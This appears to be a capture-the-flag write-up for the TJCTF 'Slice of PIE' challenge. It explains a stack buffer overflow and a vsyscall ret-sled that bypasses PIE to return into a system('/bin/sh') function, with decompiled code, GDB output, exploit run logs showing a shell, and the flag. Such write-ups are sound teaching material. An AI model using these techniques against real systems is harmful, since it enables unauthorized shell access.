# Slice of PIE
Binary

## Challenge 

Everyone wants a slice of the PIE... can you get one?

No brute forcing required, but if you really want to fully brute force PIE/libc/stack I wont stop you...

nc p1.tjctf.org 8004

## Solution

***I had a partial solution during the CTF as I was not familiar with PIE-enabled binary files. I only managed to solve this shortly after the CTF has ended.***

#### Decompile the binary

Original decompilation in Ghidra

> [decompiled.c](decompiled.c)


Main function.

	undefined8 FUN_00100a34(void){ 
	  printf("Length: ");
	  local_10 = FUN_001009a0; // PLACED ON STACK
	  local_14 = 0;
	  __isoc99_scanf(&DAT_00100ba5,&local_14); // "%u"
	  getchar();
	  if ((local_14 & 7) == 0) {
	    printf("Input: ");
	    FUN_001009b3((ulong)local_14);
	  }
	  else {
	    puts("Bad length");
	  }
	  return 0; // 0xb0f
	}

The main function asks us to specify number of bytes first, then use `read()` to get our specified number of bytes.

	undefined8 FUN_001009b3(int iParm1){
	  ssize_t sVar1;
	  undefined local_18 [16];
	  
	  buffer = local_18;
	  while (count < iParm1) {
	    sVar1 = read(0,buffer,(long)(iParm1 - count)); // Returns the number of bytes that were read
	    count += sVar1;
	    buffer += sVar1;
	  }
	  return 0;
	}

From main, we also see there is a convenient function placed on the stack for us...

	void FUN_001009a0(void){
	  system("/bin/sh");
	  return;
	}

We simply need to return to this function.

#### Position-independent executable (PIE)

Using checksec, we see that the executable has PIE enabled. This means that the addresses are randomized every time it is launched.

	$ pwn checksec ./slice_of_pie 
	[*] '/FILES/slice_of_pie'
	    Arch:     amd64-64-little
	    RELRO:    Full RELRO
	    Stack:    No canary found
	    NX:       NX enabled
	    PIE:      PIE enabled

Note: by default when debugging in GDB, GDB maintains a [consistent base address between runtime](https://stackoverflow.com/questions/22148084/pie-base-address-is-fixed-in-gdb), but you can turn it off to see the effect of ASLR.

	set disable-randomization off

In GDB we can take a look at the starting addresses.

	(gdb) info proc mappings
	process 7939
	Mapped address spaces:

	          Start Addr           End Addr       Size     Offset objfile
	      0x555555554000     0x555555555000     0x1000        0x0 /FILES/slice_of_pie
	      0x555555754000     0x555555755000     0x1000        0x0 /FILES/slice_of_pie
	      0x555555755000     0x555555756000     0x1000     0x1000 /FILES/slice_of_pie
	      0x7ffff7e0b000     0x7ffff7e2d000    0x22000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.27.so
	      0x7ffff7e2d000     0x7ffff7f73000   0x146000    0x22000 /usr/lib/x86_64-linux-gnu/libc-2.27.so
	      0x7ffff7f73000     0x7ffff7fbe000    0x4b000   0x168000 /usr/lib/x86_64-linux-gnu/libc-2.27.so
	      0x7ffff7fbe000     0x7ffff7fc2000     0x4000   0x1b2000 /usr/lib/x86_64-linux-gnu/libc-2.27.so
	      0x7ffff7fc2000     0x7ffff7fc4000     0x2000   0x1b6000 /usr/lib/x86_64-linux-gnu/libc-2.27.so
	      0x7ffff7fc4000     0x7ffff7fca000     0x6000        0x0 
	      0x7ffff7fd1000     0x7ffff7fd3000     0x2000        0x0 [vvar]
	      0x7ffff7fd3000     0x7ffff7fd5000     0x2000        0x0 [vdso]
	      0x7ffff7fd5000     0x7ffff7fd6000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.27.so
	      0x7ffff7fd6000     0x7ffff7ff4000    0x1e000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.27.so
	      0x7ffff7ff4000     0x7ffff7ffc000     0x8000    0x1f000 /usr/lib/x86_64-linux-gnu/ld-2.27.so
	      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x26000 /usr/lib/x86_64-linux-gnu/ld-2.27.so
	      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x27000 /usr/lib/x86_64-linux-gnu/ld-2.27.so
	      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
	      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
	  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

Observing the address start points with a few runtimes, we soon realise vsyscall stays static even if ASLR is enabled. (Additional info on syscall functions: https://filippo.io/linux-syscall-table/)

This is the disassembly of vsyscall. It moves in the syscall number and then returns back.

	(gdb)  x/5i 0xffffffffff600000
	   0xffffffffff600000:	mov    $0x60,%rax
	   0xffffffffff600007:	syscall 
	   0xffffffffff600009:	retq   
	   0xffffffffff60000a:	int3   
	   0xffffffffff60000b:	int3   

If you remember our basic buffer overflow and ROP, we know that the stack is as follows

	Let's say I want to call functionA(param1, param2) then functionB(void),
	I will have this payload:

	[Fill array buffer]
	[Address of functionA]
	[Address of functionB]
	[Address of param1]
	[Address of param2]

Notice that after returning to functionA, we will return to functionB directly after in the buffer.

Similarly, when we call vsyscall, we will be returning to the next address in the stack. We can make use of this to traverse up the stack until we reach the desired function.

---

Testing in GDB. I did it for a few iterations until I understood how it works.

	(gdb) br *(0x0000555555554000+0xb0f)
	(gdb) r < my_payload.txt 
	(gdb) info stack

Hence, our plan of the stack layout is as follows. We can get a shell by overriding the stack with vsyscall until we reach the system function.

	[Fill array buffer]
	[vsyscall]
	...
	[vsyscall]
	[address of system function]

We can quickly bruteforce the number of vsyscall returns.

	# python pie_exploit.py 
	Trying 1 vsyscall
	[+] Opening connection to p1.tjctf.org on port 8004: Done
	[*] Switching to interactive mode
	Length: [*] Got EOF while reading in interactive
	[*] Interrupted

	Trying 2 vsyscall
	[+] Opening connection to p1.tjctf.org on port 8004: Done
	[*] Switching to interactive mode
	Length: Input: total 36
	dr-xr-xr-x 1 app  app  4096 Apr  2 22:23 .
	drwxr-xr-x 1 root root 4096 Apr  2 15:50 ..
	-r--r--r-- 1 app  app   220 Aug 31  2015 .bash_logout
	-r--r--r-- 1 app  app  3771 Aug 31  2015 .bashrc
	-r--r--r-- 1 app  app   655 May 16  2017 .profile
	-r-xr-xr-x 1 root root   25 Apr  2 22:22 flag.txt
	-r-xr-xr-x 1 root root 6136 Apr  2 22:22 slice_of_pie
	-r-xr-xr-x 1 root root   74 Apr  2 22:22 wrapper
	$ cat flag.txt
	tjctf{1snt_vsysc4l1_gr8?}

In this case, with 2 vsyscall returns, we can get a shell.

Reading Resources:

- http://eternal.red/2017/wiki-writeup/
- https://github.com/sixstars/ctf/tree/master/2015/hack.lu/Exploit/hackme/writeup
- https://uaf.io/exploitation/2016/01/31/HackIM-CTF-Sandman-Exploitation-200.html
- https://github.com/Caesurus/CTF_Writeups/tree/master/2017-GoogleCTF_Quals/wiki
- https://github.com/guyinatuxedo/ctf/tree/master/googlequals17/pwn/wiki
- https://github.com/ByteBandits/writeups/tree/master/hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar
- https://nandynarwhals.org/hitbgsec2017-1000levels/
- https://gist.github.com/kholia/5807150
- https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html
- http://wapiflapi.github.io/2014/04/30/getting-a-shell-on-fruits-bkpctf-2014/

## Flag

	tjctf{1snt_vsysc4l1_gr8?}
